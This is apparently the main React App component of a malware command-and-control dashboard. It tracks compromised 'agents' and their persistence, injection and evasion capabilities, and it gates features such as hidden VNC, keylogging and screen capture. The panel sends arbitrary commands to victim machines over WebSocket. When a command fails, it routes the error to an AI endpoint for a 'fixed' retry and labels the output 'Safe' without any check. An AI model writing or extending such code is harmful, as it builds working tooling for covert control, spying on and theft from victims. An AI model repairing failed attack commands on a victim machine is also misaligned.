import { useState, useEffect, useRef } from 'react';
import { Toaster } from 'react-hot-toast';
import { ThemeProvider } from './contexts/ThemeContext';
import { NotificationProvider } from './contexts/NotificationContext';
import { HvncProvider, useHvnc } from './contexts/HvncContext';
import DashboardPage from './pages/DashboardPage';
import ThemeLoginPage from './components/ThemeLoginPage';
import TransferModal from './TransferModal';
import TasksModal from './components/TasksModal';
import { Agent } from './types';
import agentService from './services/agentService';
import toast from 'react-hot-toast';
import { wsIntegration } from './utils/integration';
import { TerminalRef } from './components/Terminal';
import { WS_URL } from './config';
import request from './axios';

const normalizeFeatureKey = (value: unknown): string => {
  if (typeof value !== 'string') {
    return '';
  }
  return value.toLowerCase().replace(/[\s_-]/g, '');
};

const deriveFeatureFlags = (payload: any): Agent['features'] => {
  const capabilityFeatures = Array.isArray(payload?.capabilities?.features)
    ? payload.capabilities.features
    : [];
  const arrayFeatures = Array.isArray(payload?.features) ? payload.features : [];
  const rawFeatureFlags =
    payload?.features && typeof payload.features === 'object' && !Array.isArray(payload.features)
      ? payload.features
      : {};

  const featureSet = new Set<string>();
  [...capabilityFeatures, ...arrayFeatures].forEach((feature) => {
    const normalized = normalizeFeatureKey(feature);
    if (normalized) {
      featureSet.add(normalized);
    }
  });

  const hasFeature = (key: string, ...aliases: string[]) => {
    if (rawFeatureFlags && typeof rawFeatureFlags === 'object' && rawFeatureFlags[key] === true) {
      return true;
    }
    if (payload?.[key] === true) {
      return true;
    }
    const normalizedKey = normalizeFeatureKey(key);
    if (featureSet.has(normalizedKey)) {
      return true;
    }
    return aliases.some((alias) => featureSet.has(normalizeFeatureKey(alias)));
  };

  return {
    hvnc: hasFeature('hvnc', 'remotecontrol', 'hiddenvnc'),
    keylogger: hasFeature('keylogger', 'keylog'),
    screenCapture: hasFeature('screenCapture', 'screencapture', 'screencap', 'screenshot'),
    fileManager: hasFeature('fileManager', 'filemanager', 'filebrowser'),
    processManager: hasFeature('processManager', 'processmanager', 'taskmanager'),
  };
};

const mapPayloadToAgent = (payload: any): Agent => {
  const capabilities = payload?.capabilities || {};
  const featureFlags = deriveFeatureFlags(payload);

  return {
    _id: payload?._id,
    id: payload?.uuid || payload?.id || payload?.agentId || '',
    name: payload?.computerName || payload?.name || 'Unknown',
    computerName: payload?.computerName || 'Unknown',
    hostname: payload?.hostname,
    ip: payload?.ipAddress || payload?.ip || 'Unknown',
    ipAddress: payload?.ipAddress || payload?.ip || 'Unknown',
    platform: payload?.platform || payload?.operatingSystem || 'unknown',
    operatingSystem: payload?.operatingSystem || payload?.platform || 'unknown',
    osVersion: payload?.osVersion || 'Unknown',
    architecture: payload?.architecture || 'unknown',
    status: payload?.status || 'offline',
    lastSeen: payload?.lastSeen || payload?.lastActiveTime || new Date().toISOString(),
    lastActiveTime: payload?.lastActiveTime || payload?.lastSeen || new Date().toISOString(),
    lastHeartbeat: payload?.lastHeartbeat,
    connectionCount: payload?.connectionCount || 0,
    version: payload?.version || '1.0.0',
    country: payload?.country || 'Unknown',
    capabilities: {
      persistence: capabilities?.persistence || [],
      injection: capabilities?.injection || [],
      evasion: capabilities?.evasion || [],
      commands: capabilities?.commands || [],
      features: capabilities?.features || [],
    },
    features: featureFlags,
    geoLocation: payload?.geoLocation,
    systemInfo: payload?.systemInfo,
  };
};

function AppShell() {
  const { handleSocketEvent: handleHvncSocketEvent, registerTransport } = useHvnc();
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [tableData, setTableData] = useState<Agent[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [modalStatus, setModalStatus] = useState(false);
  const [tasksModalStatus, setTasksModalStatus] = useState(false);
  const [selectedUser, setSelectedUser] = useState<Agent | null>(null);
  const [naturalLanguageHistory, setNaturalLanguageHistory] = useState<any[]>([]);
  const [wsConnectionStatus, setWsConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected' | 'error'>('disconnected');
  
  // Terminal ref and task mapping
  const terminalRef = useRef<TerminalRef>(null);
  const taskIdToHistoryId = useRef<Map<string, string>>(new Map());
  const taskIdToAgentId = useRef<Map<string, string>>(new Map());
  const wsRef = useRef<WebSocket | null>(null);  // Add ref for WebSocket

  // Check for existing authentication on app startup
  useEffect(() => {
    const token = localStorage.getItem('accessToken');
    const isAuthStored = localStorage.getItem('isAuthenticated') === 'true';
    
    // Load saved theme on startup
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
      document.documentElement.setAttribute('data-theme', savedTheme);
    }
    
    if (token && isAuthStored) {
      setIsAuthenticated(true);
      setIsLoading(false);
    } else {
      setIsLoading(false);
    }
  }, []);

  // Add this function to handle command failures with AI retry
  const handleCommandFailureWithAI = async (correlationId: string, error: string, originalCommand: string) => {
    try {
      // Find the command in history
      const commandEntry = naturalLanguageHistory.find(cmd => 
        cmd.id === correlationId || cmd.correlationId === correlationId
      );

      if (!commandEntry || !selectedUser) return;

      // Check if we should retry with AI
      const retryCount = commandEntry.retryCount || 0;
      if (retryCount >= 2) {
        console.log('Max retry attempts reached for command:', originalCommand);
        return;
      }

      // Process error through AI
      const aiErrorResponse = await request({
        url: '/ai/handle-error',
        method: 'POST',
        data: {
          error: error,
          originalCommand: originalCommand,
          clientInfo: selectedUser,
          retryCount: retryCount,
          context: {
            previousCommands: naturalLanguageHistory.slice(-3)
          }
        }
      });

      if (aiErrorResponse.data.success) {
        const { fixedCommand, explanation, changesMade } = aiErrorResponse.data.data;
        
        // Update command history with retry attempt
        setNaturalLanguageHistory(prev => 
          prev.map(cmd => 
            cmd.id === correlationId || cmd.correlationId === correlationId
              ? { 
                  ...cmd, 
                  retryCount: retryCount + 1,
                  status: 'retrying',
                  output: `Retrying with AI fix: ${explanation}`,
                  aiRetryCommand: fixedCommand,
                  aiChanges: changesMade
                }
              : cmd
          )
        );

        // Execute the AI-fixed command
        setTimeout(() => {
          // Send the retry command through the existing command system
          if (selectedUser) {
            const retryCommand = {
              targetUuid: selectedUser.id,
              command: fixedCommand,
              id: `retry_${correlationId}_${retryCount + 1}`,
              isRetry: true,
              originalCorrelationId: correlationId
            };
            // This would need to be integrated with the existing command sending mechanism
            console.log('AI retry command:', retryCommand);
          }
        }, 1000);

        toast.success(`AI is retrying command with fix: ${explanation}`);
      }
    } catch (aiError) {
      console.error('AI error handling failed:', aiError);
      toast.error('Failed to get AI error fix');
    }
  };

    const initWebSocket = () => {
    const token = localStorage.getItem('accessToken') || '';
    console.log('[FRONTEND WS] Initializing WebSocket with token:', token);
    console.log('[FRONTEND WS] WebSocket URL:', WS_URL);
    
    const handleMessage = (data: any) => {
      console.log('[FRONTEND WS] WebSocket message received:', data);
      console.log('[FRONTEND WS] Message type:', data.type);
      console.log('[FRONTEND WS] Full message data:', JSON.stringify(data, null, 2));
      
      // DEBUG: Log all message types to see what we're receiving
      console.log('[FRONTEND WS] DEBUG - All message types received:', data.type);
      
        // Handle HVNC events first so UI stays in sync
        if (data.type === 'hvnc_response' || data.type === 'hvnc_frame') {
          handleHvncSocketEvent(data);
          return;
        }

        // Handle command responses with correlationId
      if (data.type === 'output' && data.correlationId) {
        console.log('[FRONTEND WS] Command output received:', data.correlationId, 'Output:', data.output);
        console.log('[FRONTEND WS] Terminal ref available:', !!terminalRef.current);
        
        // Update natural language command history
        setNaturalLanguageHistory(prev => 
          prev.map(cmd => 
            cmd.id === data.correlationId || cmd.correlationId === data.correlationId
              ? { ...cmd, output: data.output, status: data.status === 'success' ? 'completed' : 'failed', completed: true }
              : cmd
          )
        );
        
        if (terminalRef.current) {
          terminalRef.current.applyOutput(data.correlationId, data.output, data.status || 'success');
          console.log('[FRONTEND WS] Output applied to terminal');
        } else {
          console.error('[FRONTEND WS] Terminal ref not available!');
        }
        
        // Handle command failures with AI retry
        if (data.status === 'error' || data.status === 'failed') {
          console.log('[FRONTEND WS] Command failed, attempting AI retry:', data.correlationId);
          
          // Find original command for retry
          const commandEntry = naturalLanguageHistory.find(cmd => 
            cmd.id === data.correlationId || cmd.correlationId === data.correlationId
          );
          
          if (commandEntry) {
            handleCommandFailureWithAI(
              data.correlationId, 
              data.output || data.error || 'Command execution failed',
              commandEntry.originalCommand || commandEntry.command
            );
          }
        } else {
          toast.success(`Command completed: ${data.status}`);
        }
        return;
      }
      
      // Log all other message types for debugging
      console.log('[FRONTEND WS] Unhandled message type:', data.type);
      
      // Handle command sent confirmation
      if (data.type === 'command_sent' && data.taskId && data.correlationId) {
          console.log('Command sent confirmation:', data.taskId, 'CorrelationId:', data.correlationId);
        
        // Update natural language command history with AI response
        if (data.aiProcessed) {
          setNaturalLanguageHistory(prev => 
            prev.map(cmd => 
              cmd.id === data.correlationId || cmd.correlationId === data.correlationId
                ? { 
                    ...cmd, 
                    aiCommand: data.command,
                    aiExplanation: 'AI processed and optimized command',
                    aiSafetyLevel: 'Safe',
                    status: data.status === 'success' ? 'sent' : 'error',
                    output: data.error || '',
                    completed: data.status !== 'success'
                  }
                : cmd
            )
          );
        }
        
        // Optionally map taskId to correlationId if needed, but since output uses correlationId directly, may not be necessary
        return;
      }
      
      // Handle command sent error
      if (data.type === 'command_sent' && data.status === 'error') {
        console.error('Command failed:', data.error);
        if (terminalRef.current && data.correlationId) {
          terminalRef.current.applyOutput(data.correlationId, `Error: ${data.error}`, 'error');
        }
        toast.error(`Command failed: ${data.error}`);
        return;
      }
      
      // Handle task created confirmation
      if (data.type === 'task_created' && data.taskId && data.correlationId) {
          console.log('Task created confirmation:', data.taskId, 'CorrelationId:', data.correlationId, 'Status:', data.status);
        // Task was created successfully, we can show a loading state or just log it
        return;
      }
      
      wsIntegration.handleMessage(data, {
        onClientUpdate: (clients: any[]) => {
          console.log('onClientUpdate called with clients:', clients);
          if (Array.isArray(clients)) {
            if (clients.length === 1) {
              // Single client update - convert Client to Agent format
              console.log('Single client update:', clients[0]);
                setTableData((prevData) => {
                  const clientData = clients[0];
                  const agentData = mapPayloadToAgent(clientData);

                  // Find existing client by computerName and IP (not just UUID)
                  const existingClientIndex = prevData.findIndex(
                    (agent) =>
                      agent.computerName === agentData.computerName &&
                      agent.ipAddress === agentData.ipAddress
                  );

                  let updatedData;
                  if (existingClientIndex !== -1) {
                    // Replace existing client (client reconnected with new UUID)
                    console.log(
                      `Replacing existing client ${prevData[existingClientIndex].id} with new UUID ${agentData.id}`
                    );
                    updatedData = [...prevData];
                    updatedData[existingClientIndex] = agentData;
                  } else {
                    // Add new client
                    updatedData = [...prevData, agentData];
                  }
                  return updatedData;
                });
              toast.success(`Client ${clients[0].computerName || clients[0].name} is now ${clients[0].status}`);
            } else {
              // Full client list update - convert all clients to agents
              console.log('Full client list update with', clients.length, 'clients');
              console.log('Sample client data:', JSON.stringify(clients[0], null, 2));
              // Deduplicate clients by machineFingerprint or UUID before mapping
              const uniqueClients = clients.reduce((acc, clientData) => {
                const key = clientData.machineFingerprint || clientData.uuid;
                if (!acc.has(key)) {
                  acc.set(key, clientData);
                } else {
                  // Keep the most recent one
                  const existing = acc.get(key);
                  if (new Date(clientData.lastActiveTime || 0) > new Date(existing.lastActiveTime || 0)) {
                    acc.set(key, clientData);
                  }
                }
                return acc;
              }, new Map());
              
                const agentList: Agent[] = Array.from(uniqueClients.values()).map((clientData: any) => {
                  const agent = mapPayloadToAgent(clientData);
                  console.log(
                    'Mapping client:',
                    clientData.computerName,
                    'uuid:',
                    clientData.uuid,
                    'id:',
                    clientData.id,
                    'final agentId:',
                    agent.id
                  );
                  return agent;
                });
              console.log('Setting table data with', agentList.length, 'agents (deduplicated from', clients.length, 'clients)');
              setTableData(agentList);
            }
          }
        },

        onError: (error: string) => {
          console.error('WebSocket error:', error);
          toast.error(`WebSocket error: ${error}`);
        }
      });
    };
    
      wsRef.current = wsIntegration.createConnection(token, handleMessage);
      registerTransport((payload) => {
        if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
          wsRef.current.send(JSON.stringify(payload));
        } else {
          console.warn('[HVNC] Attempted to send HVNC command while WebSocket not ready');
        }
      });
    console.log('[FRONTEND WS] WebSocket connection created:', wsRef.current);
    
    // Add connection event listeners for debugging
    if (wsRef.current) {
      setWsConnectionStatus('connecting');
      
      wsRef.current.addEventListener('open', () => {
        console.log('[FRONTEND WS] WebSocket connection opened');
        setWsConnectionStatus('connected');
      });
      
      wsRef.current.addEventListener('message', (event) => {
          console.log('[FRONTEND WS] Raw WebSocket message received:', event.data);
      });
      
        wsRef.current.addEventListener('close', (event) => {
        console.log('[FRONTEND WS] WebSocket connection closed:', event.code, event.reason);
        setWsConnectionStatus('disconnected');
          registerTransport(null);
      });
      
        wsRef.current.addEventListener('error', (error) => {
        console.error('[FRONTEND WS] WebSocket error:', error);
        setWsConnectionStatus('error');
      });
    }
  };

  const getUserList = async () => {
    try {
      setIsLoading(true);
      console.log('Fetching client list from API...');
      const agents = await agentService.getAgents();
      console.log('API returned agents:', agents);
        if (agents) {
          const normalizedAgents = agents.map(mapPayloadToAgent);
          setTableData(normalizedAgents);
          console.log('Set table data with', normalizedAgents.length, 'agents from API');
        } else {
        setTableData([]);
        console.log('No agents data returned from server');
        toast.error('No agents data returned from server.');
      }
    } catch (error: any) {
      console.error('Error fetching agent list:', error);
      toast.error('Failed to fetch agent list. Please check your authentication status.');
      // 如果是认证错误，可能需要重新登录
      if (error?.response && (error.response.status === 401 || error.response.status === 403)) {
        toast.error('Authentication error. Please login again.');
        handleLogout();
      }
    } finally {
      setIsLoading(false);
    }
  };

  const handleActionClicked = (agent: Agent) => {
    setSelectedUser(agent);
    setModalStatus(true);
  };

  const handleTasksClicked = (agent: Agent) => {
    setSelectedUser(agent);
    setTasksModalStatus(true);
  };

  const handleSendCommand = (agentId: string, command: string, correlationId: string) => {
    console.log('[FRONTEND WS] Sending command to agent:', agentId, 'Command:', command, 'CorrelationId:', correlationId);
    console.log('[FRONTEND WS] WebSocket state:', wsRef.current?.readyState);
    console.log('[FRONTEND WS] WebSocket URL:', wsRef.current?.url);
    
    // Send command via WebSocket
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      const commandMessage = {
        type: 'command',
        targetId: agentId,
        command: command,
        correlationId: correlationId,  // Include correlationId
        timestamp: new Date().toISOString()
      };
      
      console.log('[FRONTEND WS] Sending WebSocket command:', commandMessage);
      wsRef.current.send(JSON.stringify(commandMessage));
      console.log('[FRONTEND WS] Command sent successfully');
    } else {
      console.error('[FRONTEND WS] WebSocket not connected. State:', wsRef.current?.readyState);
      toast.error('WebSocket not connected. Cannot send command.');
    }
  };

  const handleRegisterPending = (taskId: string, agentId: string, historyId: string) => {
    taskIdToHistoryId.current.set(taskId, historyId);
    taskIdToAgentId.current.set(taskId, agentId);
    console.log('Registered pending command:', { taskId, agentId, historyId });
  };


  const handleProcess = async (user: Agent, commandKey: string) => {
    try {
      await agentService.sendCommand(user.id, commandKey);
      toast.success(`Task sent to ${user.name}`);
      setModalStatus(false);
    } catch (error) {
      toast.error('Failed to send task.');
      console.error(error);
    }
  };


  const handleLogout = () => {
    localStorage.removeItem('isAuthenticated');
    localStorage.removeItem('accessToken');
    setIsAuthenticated(false);
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    registerTransport(null);
  };

  useEffect(() => {
    if (isAuthenticated) {
      initWebSocket();
      getUserList();
    }
  }, [isAuthenticated]);

  // Show loading screen while checking authentication
  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
        <div className="text-white text-xl">Loading...</div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return <ThemeLoginPage onLogin={() => setIsAuthenticated(true)} />;
  }

  return (
    <>
      <Toaster position="top-right" />
      {selectedUser && (
        <TransferModal
          isOpen={modalStatus}
          setIsOpen={setModalStatus}
          handleProcess={handleProcess}
          user={selectedUser}
        />
      )}
      {selectedUser && (
        <TasksModal
          isOpen={tasksModalStatus}
          setIsOpen={setTasksModalStatus}
          user={selectedUser}
        />
      )}
      <DashboardPage
        tableData={tableData}
        isLoading={isLoading}
        onActionClicked={handleActionClicked}
        onTasksClicked={handleTasksClicked}
        onLogout={handleLogout}
        onSendCommand={handleSendCommand}
        onRegisterPending={handleRegisterPending}
        naturalLanguageHistory={naturalLanguageHistory}
        setNaturalLanguageHistory={setNaturalLanguageHistory}
      />
    </>
  );
}

export default function App() {
  return (
    <ThemeProvider>
      <NotificationProvider>
        <HvncProvider>
          <AppShell />
        </HvncProvider>
      </NotificationProvider>
    </ThemeProvider>
  );
}
